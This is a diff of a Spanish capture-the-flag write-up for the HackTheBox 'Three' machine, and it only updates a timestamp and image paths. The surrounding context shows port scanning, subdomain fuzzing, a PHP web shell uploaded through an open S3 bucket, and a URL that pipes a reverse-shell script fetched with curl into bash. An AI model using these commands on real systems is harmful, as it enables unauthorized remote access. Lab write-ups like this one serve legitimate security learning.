@@ -1,7 +1,7 @@
 ---
 publish: true
 created: 2026-09-11T12:16:55.947Z
-modified: 2026-09-11T12:24:56.609Z
+modified: 2026-09-11T18:12:58.321Z
 ---
 
 # Three
@@ -31,13 +31,13 @@ Comenzamos con un escaneo para identificar que puertos están abiertos.
 ❯ sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 10.129.242.54 -oG targeted
 ```
 
-![image.png](/images/HackTheBox/image.png)
+![image.png](WriteUps/images/HackTheBox/image.png)
 
 ```bash
 sudo namp -p22,80 -SCV 10.129.242.54 -oN tallports
 ```
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](WriteUps/images/HackTheBox/image 1.png)
 
 ### **Enumeración de servicios**
 
@@ -51,7 +51,7 @@ Una vez listado los puertos accesibles, procederemos a realizar la enumeración 
 
 - **Web Discovery**
 
-![image.png](/images/HackTheBox/image%202.png)
+![image.png](WriteUps/images/HackTheBox/image 2.png)
 
 ```bash
 echo "10.129.203.61 thetoppers.htb" | sudo tee -a /etc/hosts
@@ -70,7 +70,7 @@ gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/sub
 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:FUZZ.thetoppers.htb" -u 10.129.203.61 --hl=234   
 ```
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](WriteUps/images/HackTheBox/image 3.png)
 
 Añadimos el subdominio al etc/host
 
@@ -80,7 +80,7 @@ echo "10.129.203.61 thetoppers.htb,s3.thetoppers.htb" | sudo tee -a /etc/hosts
 
 Visitamos el subdominio: s3.thetoppers.htb
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](WriteUps/images/HackTheBox/image 4.png)
 
 Hacemos fuzzing:
 
@@ -88,7 +88,7 @@ Hacemos fuzzing:
 gobuster dir -u http://s3.thetoppers.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ```
 
-![image.png](/images/HackTheBox/image%205.png)
+![image.png](WriteUps/images/HackTheBox/image 5.png)
 
 ## Explotación
 
@@ -100,19 +100,19 @@ Seguimos configuracion de AWS:
 aws configure
 ```
 
-![image.png](/images/HackTheBox/image%206.png)
+![image.png](WriteUps/images/HackTheBox/image 6.png)
 
 ```bash
 aws --endpoint=http://s3.thetoppers.htb s3 ls 
 ```
 
-![image.png](/images/HackTheBox/image%207.png)
+![image.png](WriteUps/images/HackTheBox/image 7.png)
 
 ```bash
 aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 ```
 
-![image.png](/images/HackTheBox/image%208.png)
+![image.png](WriteUps/images/HackTheBox/image 8.png)
 
 Probamos a subir un fichero a la raiz del servidor :
 
@@ -133,7 +133,7 @@ Accedemos a :
 http://thetoppers.htb/shell.php?cmd=id
 ```
 
-![image.png](/images/HackTheBox/image%209.png)
+![image.png](WriteUps/images/HackTheBox/image 9.png)
 
 Creamos un fichero que al llamarlo por curl, nos de acceso a una rever shell: rever.sh
 
@@ -163,7 +163,7 @@ http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.76:8080/rever.sh|bash
 
 Obtenemos acceso a la maquina:
 
-![image.png](/images/HackTheBox/image%2010.png)
+![image.png](WriteUps/images/HackTheBox/image 10.png)
 
 ## Explotación posterior
 
@@ -176,7 +176,7 @@ Obtenemos acceso a la maquina:
 find / -name  "flag.txt"
 ```
 
-![image.png](/images/HackTheBox/image%2011.png)
+![image.png](WriteUps/images/HackTheBox/image 11.png)
 
 ## Conclusión
 
